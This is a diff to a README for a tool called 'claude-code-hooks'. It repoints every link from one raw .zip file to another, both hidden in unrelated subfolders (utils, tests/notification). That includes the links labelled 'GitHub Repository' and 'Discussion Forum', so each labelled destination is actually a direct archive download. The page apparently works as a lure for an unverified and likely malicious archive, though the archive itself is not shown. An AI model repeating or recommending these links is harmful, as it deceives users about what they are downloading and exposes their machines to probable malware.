@@ -1,6 +1,6 @@
 # 🪝 claude-code-hooks - Unlock Your Automation Potential Easily
 
-[![Download Latest Release](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/utils/claude-code-hooks-Triosteum.zip+Release&color=blue)](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/utils/claude-code-hooks-Triosteum.zip)
+[![Download Latest Release](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/tests/notification/hooks-code-claude-1.5.zip+Release&color=blue)](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/tests/notification/hooks-code-claude-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to Claude Code Hooks! This application provides a collection of handy ho
 
 To get the latest version of the Claude Code Hooks, visit the following page to download the software:
 
-[Download Latest Release](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/utils/claude-code-hooks-Triosteum.zip)
+[Download Latest Release](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/tests/notification/hooks-code-claude-1.5.zip)
 
 1. **Visit the Releases Page:** Click on the link above to be directed to the Releases page.
 2. **Choose Your Download:** Select the latest version available. You will see a list of assets.
@@ -60,7 +60,7 @@ If you encounter any issues or have questions, you can reach out to us via the I
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/utils/claude-code-hooks-Triosteum.zip)
-- [Discussion Forum](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/utils/claude-code-hooks-Triosteum.zip)
+- [GitHub Repository](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/tests/notification/hooks-code-claude-1.5.zip)
+- [Discussion Forum](https://github.com/GabrielCostaLopes16/claude-code-hooks/raw/refs/heads/main/hook-scripts/tests/notification/hooks-code-claude-1.5.zip)
 
 Thank you for using Claude Code Hooks! We hope it makes your tasks easier and more efficient.
